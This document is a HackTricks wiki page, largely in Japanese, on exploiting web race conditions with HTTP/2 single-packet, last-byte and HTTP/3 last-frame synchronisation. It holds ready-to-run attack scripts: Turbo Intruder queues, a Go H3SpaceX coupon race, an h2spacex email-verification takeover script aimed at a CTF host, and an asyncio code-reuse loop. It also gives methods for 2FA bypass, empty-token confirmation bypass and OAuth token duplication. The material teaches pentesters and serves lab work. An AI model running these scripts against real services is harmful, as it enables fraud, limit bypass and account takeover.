# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> この手法を深く理解するには、オリジナルのレポートを[https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)で確認してください

## Race Condition攻撃の強化

race conditionsを利用する際の主な障害は、複数のリクエストが同時に処理され、それらの処理時間の差が非常に小さいこと（理想的には1ms未満）を確実にする点です。

以下にリクエストの同期化のための手法を示します:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: 単一のTCP接続で二つのリクエストを送信でき、ネットワークのジッターの影響を低減します。しかし、サーバー側の変動により、二つのリクエストだけでは一貫したrace conditionエクスプロイトを達成できない場合があります。
- **HTTP/1.1 'Last-Byte Sync'**: 20〜30件のリクエストの大部分を事前送信し、最後の小さな断片だけを保留しておき、それをまとめて送ることでサーバーに同時到着させます。

**Preparation for Last-Byte Sync** involves:

1. ヘッダとボディデータを最後の1バイトを除いて送信し、ストリームを終了しない。
2. 最初の送信後に100ms待機する。
3. TCP_NODELAYを無効にしてNagle's algorithmを利用し、最終フレームをバッチ処理する。
4. 接続をウォームアップするためにpingを送る。

保留していたフレームを送信すると、それらが単一のパケットで到着するはずで、Wiresharkで確認できます。この方法は通常race condition攻撃に関与しない静的ファイルには適用されません。

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3はQUIC（UDP）上で動作します。TCPのcoalescingやNagleに頼れないため、既製のクライアントでは従来のlast‑byte syncは機能しません。代わりに、複数のQUIC stream‑final DATAフレーム（FIN）を意図的に同じUDPデータグラムにまとめ、サーバーが同一のスケジューリングティックでターゲットのリクエストをすべて処理するようにする必要があります。
- **How to do it**: QUICフレーム制御を公開する専用ライブラリを使います。例えば、H3SpaceXはquic-goを操作して、ボディ付きリクエストとボディなしのGETスタイルリクエストの両方でHTTP/3 last‑frame synchronizationを実装します。
- Requests‑with‑body: Nストリームに対してHEADERS + DATAを最後の1バイトを除いて送信し、その後各ストリームの最終バイトをまとめてフラッシュします。
- GET‑style: 偽のDATAフレームを作成する（またはContent‑Length付きの小さなボディ）して、すべてのストリームを1つのデータグラムで終了させます。
- **Practical limits**:
  - 同時実行数はピアのQUIC max_streamsトランスポートパラメータ（HTTP/2のSETTINGS_MAX_CONCURRENT_STREAMSに類似）で制限されます。値が低い場合は複数のH3接続を開き、レースを分散させてください。
  - UDPデータグラムサイズおよびパスMTUが、まとめられるstream‑finalフレーム数を制限します。必要に応じてライブラリは複数のデータグラムに分割しますが、単一データグラムでのフラッシュが最も信頼性があります。
- **Practice**: 公開のH2/H3レースラボやサンプルエクスプロイトがH3SpaceXに付属しています。

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### サーバーアーキテクチャへの適応

ターゲットのアーキテクチャを理解することは重要です。フロントエンドサーバーはリクエストを異なる経路でルーティングすることがあり、タイミングに影響を与えます。重要でないリクエストで事前にサーバー側の接続をウォームアップすると、リクエストのタイミングを均一化できる場合があります。

#### セッションベースのロッキングへの対処

PHPのsession handlerのようなフレームワークはセッションごとにリクエストを直列化するため、脆弱性を覆い隠す可能性があります。各リクエストに異なるセッショントークンを使用することで、この問題を回避できます。

#### レートやリソース制限の克服

接続のウォーミングが効果を発揮しない場合、ダミーリクエストを大量に送って意図的にWebサーバーのレートやリソース制限による遅延を誘発すると、サーバー側でレースコンディションに適した遅延が生じ、single-packet attackを容易にすることがあります。

## 攻撃例

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: リクエストを **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`)、に送信できます。リクエスト内で総当たりしたい値を **`%s`** にして変更できます（例: `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`）そしてドロップダウンから **`examples/race-single-packer-attack.py`** を選択します:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

もし**異なる値を送信する**のであれば、クリップボードからwordlistを使用する次のコードに変更できます:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> ウェブが HTTP2 をサポートしていない（HTTP1.1 のみ）の場合は、`Engine.THREADED` または `Engine.BURP` を `Engine.BURP2` の代わりに使用してください。

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: 1つの endpoint にリクエストを送り、その後他の複数の endpoint にリクエストを送って RCE を引き起こす必要がある場合は、`race-single-packet-attack.py` スクリプトを次のように変更できます:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Burp Suite の **Repeater** でも、新しいオプション '**Send group in parallel**' から利用できます。
- **limit-overrun** の場合、グループに **同じ request を50回** 追加するだけで済みます。
- **connection warming** の場合、**group** の **先頭** に、ウェブサーバーの非静的な部分へいくつかの **requests** を追加できます。
- 2つのサブステートのステップで、処理をある **request** から別の **request** に移す間に **delaying** を行いたい場合は、両方の **request** の間に余分な **requests** を追加できます。
- **multi-endpoint** RC の場合、まず **hidden state** に遷移する **request** を送信し、その直後にその **hidden state** を **exploits** する **50 requests** を送ればよいです。

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- Automated python script: このスクリプトの目的は、ユーザーの email を変更しつつ、新しい email の verification token が最後の emails に届くまで継続的に確認することです（これはコード内で、email を変更できても verification が古い email に送られてしまう RC が確認されたためです。つまり email を示す変数が最初のものですでに設定されていたためです）。\
受信した emails に "objetivo" という単語が見つかったとき、それが変更された email の verification token を受け取ったことを示すので、攻撃を終了します。
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- エンジン選択：HTTP/2 ターゲットでは `Engine.BURP2` を使用して single‑packet attack をトリガーします；HTTP/1.1 の last‑byte sync には `Engine.THREADED` または `Engine.BURP` にフォールバックします。
- `gate`/`openGate`：`gate='race1'`（または試行ごとの gates）で多くのコピーをキューし、各リクエストの末尾を保留します；`openGate('race1')` は全ての末尾をまとめてフラッシュし、ほぼ同時に到着させます。
- 診断：Turbo Intruder の負のタイムスタンプは、リクエストが完全に送信される前にサーバが応答したことを示し、オーバーラップが発生していることの証拠になります。これは実際のレース（race）では期待される挙動です。
- 接続ウォーミング：最初に ping やいくつかの無害なリクエストを送ってタイミングを安定させます；最終フレームのバッチ化を促すために `TCP_NODELAY` を無効にすることもできます。


### Single Packet Attack の改善

元の研究ではこの攻撃は 1,500 バイトの制限があると説明されています。しかし、[**この投稿**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) では、IP レイヤのフラグメンテーションを使用して single packet attack の 1,500 バイト制限を TCP の **65,535 B ウィンドウ制限** まで拡張する方法が説明されています（単一パケットを複数の IP パケットに分割し、異なる順序で送信することで、すべてのフラグメントがサーバに到達するまで再組立てを防げます）。この手法により研究者は約 166ms で 10,000 件のリクエストを送信できました。

この改善により、数百〜数千のパケットが同時に到着することを要する RC に対する攻撃の信頼性は高まりますが、ソフトウェア側の制限も存在する点に注意してください。Apache、Nginx、Go のような一般的な HTTP サーバは `SETTINGS_MAX_CONCURRENT_STREAMS` をそれぞれ 100、128、250 に厳格に設定している場合があります。一方で NodeJS や nghttp2 などは無制限です。\
これは基本的に Apache が単一の TCP 接続からの HTTP 接続（ストリーム）を 100 件までしか扱わないことを意味し（この RC 攻撃を制限します）。HTTP/3 では同等の制限が QUIC の max_streams トランスポートパラメータになります — もし小さい場合は複数の QUIC 接続に race を分散させてください。

この手法を使った例はリポジトリ https://github.com/Ry0taK/first-sequence-sync/tree/main にあります。

## Raw BF

前述の研究以前、以下のようなペイロードが使われており、RC を引き起こすためにパケットを可能な限り速く送信しようとしていました。

- **Repeater:** 前節の例を確認してください。
- **Intruder**: **request** を **Intruder** に送信し、**Options menu** 内で **number of threads** を **30** に設定し、ペイロードとして **Null payloads** を選択して **30** を生成します。
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC 手法**

### Limit-overrun / TOCTOU

これは最も基本的なタイプの race condition で、**脆弱性**が**アクションを実行できる回数を制限する場所に現れる**場合です。例えば、Webストアで同じ割引コードを何度も使うようなケースです。非常に簡単な例は [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) や [**this bug**](https://hackerone.com/reports/759247) にあります。

この種の攻撃には多くのバリエーションがあります。例：

- ギフトカードを複数回利用する
- 製品を何度も評価する
- 口座残高を超えて出金・送金する
- 単一の CAPTCHA 解答を再利用する
- anti-brute-force rate limit をバイパスする

### **Hidden substates**

複雑な race condition を悪用するには、隠れた、あるいは**意図しないマシンのサブステート**に短時間だけ介入できる機会を利用することが多いです。アプローチ方法は次の通り：

1. **潜在的な隠れたサブステートを特定する**
- ユーザープロファイルやパスワードリセット処理など、重要なデータを変更または操作するエンドポイントを特定することから始めます。注目すべき点：
- **Storage**: クライアント側でデータを扱うものよりも、サーバー側の永続データを操作するエンドポイントを優先する。
- **Action**: 既存データを変更する操作を探す。新しいデータを追加する操作よりも悪用可能な条件が発生しやすい。
- **Keying**: 成功する攻撃は通常、username や reset token など同じ識別子でキー付けされた操作を含む。
2. **初期のプロービングを実施する**
- 特定したエンドポイントに対して race condition 攻撃を試し、期待される結果との逸脱を観察する。予期しないレスポンスやアプリケーションの挙動変化は脆弱性の兆候となり得る。
3. **脆弱性を実証する**
- 攻撃を脆弱性を悪用するのに必要な最小限のリクエスト数（多くの場合2つ）に絞り込む。このステップは精密なタイミングが必要なため、複数回の試行や自動化を要することがある。

### Time Sensitive Attacks

リクエストのタイミング精度は脆弱性を露呈させることがあり、特にタイムスタンプのような予測可能な方法でセキュリティトークンが生成されている場合に顕著です。例えば、パスワードリセットトークンをタイムスタンプに基づいて生成すると、同時のリクエストで同一トークンが発生する可能性があります。

**悪用方法:**

- 単一パケット攻撃のような精密なタイミングを使い、同時にパスワードリセットリクエストを送る。トークンが一致すれば脆弱性を示す。

**例:**

- 同時に2つのパスワードリセットトークンを要求して比較する。トークンが一致すればトークン生成に欠陥があることを示唆する。

試すには [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) を確認してください。

## 隠れたサブステートのケーススタディ

### Pay & add an Item

ストアで**支払いを行い**、支払対象とならない**追加のアイテムを加える**方法は [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) を確認してください。

### Confirm other emails

考え方は、**あるメールアドレスを検証すると同時に別のメールアドレスに変更する**ことで、プラットフォームが変更後のメールを実際に検証するかを調べることです。

### Change email to 2 emails addresses Cookie based

[**this research**](https://portswigger.net/research/smashing-the-state-machine) によると、Gitlab はこの方法で乗っ取りの脆弱性があり、**あるメールの email verification token を別のメールに送信する**可能性がありました。

試すには [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) を確認してください。

### Hidden Database states / Confirmation Bypass

もしデータベースに情報を追加するために2つの異なる書き込みが行われる場合、最初のデータだけが書き込まれている短い時間帯が存在します。例えば、ユーザーを作成する際に username と password が書き込まれてから、アカウント確認用の token が書き込まれることがあります。つまり、短時間アカウント確認用の token が null になっている可能性があります。

したがって、アカウントを登録してすぐに空の token (`token=` or `token[]=` or any other variation) を使って複数回確認リクエストを送ることで、自分が管理していないメールのアカウントを確認できてしまう可能性があります。

試すには [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) を確認してください。

### Bypass 2FA

以下の擬似コードは、セッションが作成される間にごく短時間 **2FA が適用されない**ため、race condition に対して脆弱です：
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 永続的保持

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). これらのサービスではアプリケーションを作成し、プロバイダが登録しているユーザを認証することができます。これを行うために、**client** は **permit your application** して **OAUth provider** 内の一部データへアクセスする必要があります。\
ここまでは google/linkedin/github 等での一般的なログインと同じで、次のようなページが表示されます: "_Application <InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

この**問題**はあなたが**accept it** したときに発生し、悪意のあるアプリケーションへ自動的に **`authorization_code`** が送られます。すると、この**application は OAUth サービスプロバイダの Race Condition を悪用して、あなたのアカウントのために `authorization_code` から複数の AT/RT**（_Authentication Token/Refresh Token_）を生成します。基本的には、あなたがアプリにデータアクセスを許可した事実を利用して**複数のアカウントを作成**します。そこで、もしあなたがそのアプリへのアクセスを停止しても、AT/RT の一組は削除されるかもしれませんが、**他のものは引き続き有効なまま**です。

#### Race Condition in `Refresh Token`

有効な RT を**取得した**後は、それを**悪用して複数の AT/RT を生成**しようとすることができます。そして、たとえユーザが悪意のあるアプリケーションの権限を取り消しても、**複数の RT が依然として有効なまま**になることがあります。

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## 参考資料

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
